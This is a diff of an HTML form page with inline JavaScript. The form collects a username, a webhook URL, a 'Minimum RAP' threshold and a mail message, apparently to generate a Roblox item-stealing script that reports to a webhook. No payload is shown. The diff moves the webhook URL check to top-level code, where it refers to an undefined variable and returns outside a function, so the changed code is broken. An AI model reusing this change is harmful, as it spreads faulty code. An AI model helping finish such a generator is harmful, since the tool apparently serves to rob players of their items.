@@ -84,7 +84,7 @@
       <label for="username">Username:</label>
       <input type="text" id="username" name="username" required><br><br>
 
-      <label for="webhook">Webhook URL:</label>
+      <label for="webhook">Webhook:</label>
       <input type="url" id="webhook" name="webhook" required><br><br>
 
       <label for="minimumRAP">Minimum RAP:</label>
@@ -114,11 +114,18 @@
       const generateButton = document.getElementById('generateBtn');
       const copyButton = document.getElementById('copyBtn');
 
-      const urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
-        '(([a-zA-Z\\d]([a-zA-Z\\d-]*[a-zA-Z\\d])*)\\.?)+[a-zA-Z]{2,}' + // domain name
-        '(\\:\\d+)?(\\/[-a-zA-Z\\d%_.~+]*)*' + // port and path
-        '(\\?[;&a-zA-Z\\d%_.~+=-]*)?' + // query string
-        '(\\#[-a-zA-Z\\d_]*)?$','i'); // fragment locator
+        // Validate webhook URL
+        const urlPattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
+          '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.?)+[a-z]{2,}|'+ // domain name
+          '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
+          '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
+          '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
+          '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
+
+        if (!urlPattern.test(webhook)) {
+          alert("Please enter a valid Webhook URL.");
+          return;
+        }
 
       generateButton.addEventListener('click', function(event) {
         event.preventDefault(); 
@@ -133,12 +140,6 @@
 
         if (!username || !webhook || !minimumRAP || !mailMessage) {
           alert("Please fill in all fields.");
-          return;
-        }
-
-        // Ensure the URL starts with http:// or https://
-        if (!urlPattern.test(webhook)) {
-          alert("Please enter a valid webhook URL.");
           return;
         }
 
